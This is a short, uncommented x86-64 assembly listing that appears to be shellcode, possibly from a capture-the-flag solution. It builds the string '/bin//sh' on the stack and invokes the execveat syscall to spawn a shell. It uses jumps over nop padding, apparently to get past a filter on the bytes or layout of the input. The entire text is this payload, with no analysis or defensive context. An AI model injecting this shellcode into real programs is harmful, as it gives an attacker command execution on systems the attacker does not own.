push   0x42
pop    rax
inc    ah
cqo
push   rdx
jmp    $+8
nop
nop
nop
nop
nop
nop
movabs rdi, 0x68732f2f6e69622f
jmp    $+8
nop
nop
nop
nop
nop
nop
push   rdi
push   rsp
pop    rsi
mov    r8, rdx

mov    r10, rdx
syscall
